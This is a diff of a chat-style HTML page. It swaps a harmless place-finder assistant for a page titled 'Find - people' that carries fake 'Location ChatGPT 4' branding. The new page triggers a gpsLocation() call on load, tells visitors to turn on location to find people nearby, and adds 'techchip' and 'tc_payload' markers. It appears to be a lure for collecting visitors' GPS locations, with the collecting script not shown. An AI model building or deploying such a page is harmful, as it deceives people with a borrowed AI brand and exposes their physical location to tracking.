@@ -1,45 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chat Places Assistant</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Find - people</title>
+  <link rel="stylesheet" href="./style.css">
+
 </head>
-<body>
+<body onload="gpsLocation()">
+<section class="msger">
+  <header class="msger-header">
+    <div class="msger-header-title">
+      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
+    </div>
+    <div class="msger-header-options">
+      <span><i class="fas fa-cog"></i></span>
+    </div>
+  </header>
 
-  <section class="msger">
-    <header class="msger-header">
-      <div class="msger-header-title">
-        📍 Place Finder Assistant
-      </div>
-      <div class="msger-header-options">
-        <span>● Online</span>
-      </div>
-    </header>
+  <main class="msger-chat">
+    <div class="msg left-msg">
+      <div
+       class="msg-img"
+       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
+      ></div>
 
-    <main class="msger-chat" id="msgerChat">
-      <!-- Welcome Message -->
-      <div class="msg left-msg">
-        <div class="msg-img" style="background-image: url('https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=100&q=80')"></div>
-        <div class="msg-bubble">
-          <div class="msg-info">
-            <div class="msg-info-name">Assistant</div>
-            <div class="msg-info-time">Just now</div>
-          </div>
-          <div class="msg-text">
-            Hi! Tell me what place or venue you are looking for (e.g., "Eiffel Tower" or "Coffee near me").
-          </div>
+      <div class="msg-bubble">
+        <div class="msg-info">
+          <div class="msg-info-name">Admin</div>
+          <div class="msg-info-time"></div>
+        </div>
+
+        <div class="msg-text">
+          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
         </div>
       </div>
-    </main>
+    </div>
 
-    <form class="msger-inputarea" id="msgerForm">
-      <input type="text" class="msger-input" id="msgerInput" placeholder="Type a place name..." autocomplete="off">
-      <button type="submit" class="msger-send-btn">Send</button>
-    </form>
-  </section>
+  </main>
 
-  <script src="script.js"></script>
+  <form class="msger-inputarea">
+    <input type="text" class="msger-input" placeholder="Ask me anything...">
+    <button type="submit" class="msger-send-btn">Send</button>
+  </form>
+</section>
+<script  src="./script.js"></script>
+<p id="techchip"></p>
+<!-- tc_payload -->
+
 </body>
 </html>
